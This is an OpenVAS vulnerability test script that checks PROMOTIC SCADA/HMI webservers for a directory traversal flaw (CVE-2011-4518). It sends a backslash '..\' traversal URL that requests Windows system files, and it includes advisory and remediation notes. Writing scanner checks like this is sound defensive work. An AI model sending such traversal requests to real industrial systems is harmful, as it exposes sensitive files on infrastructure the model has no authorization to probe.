###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_promotic_scada_hmi_server_dir_trav_vuln.nasl 12063 2018-10-24 14:21:54Z cfischer $
#
# PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802041");
  script_version("$Revision: 12063 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 16:21:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2011-4518");
  script_name("PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Promotic/banner");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46430");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/promotic_1-adv.txt");
  script_xref(name:"URL", value:"http://www.promotic.eu/en/promotic/scada-pm.htm");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"PROMOTIC SCADA/HMI Server Version 8.1.3. Other versions may
  also be affected.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of URI containing
  '..\..\' sequences, which allows attackers to read arbitrary files via directory traversal attacks.");

  script_tag(name:"solution", value:"Update to version 8.1.5 or later.");

  script_tag(name:"summary", value:"The host is running PROMOTIC SCADA/HMI Webserver and is prone to
  directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
res = http_get_cache( item:"/webdir/default.htm", port:port );
if( ">PROMOTIC WEB Server<" >!< res || "Server: Pm" >!< res ) exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( find:"/", string:file, replace:"\" );
  url = "/webdir/..\..\..\..\..\..\..\..\..\" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );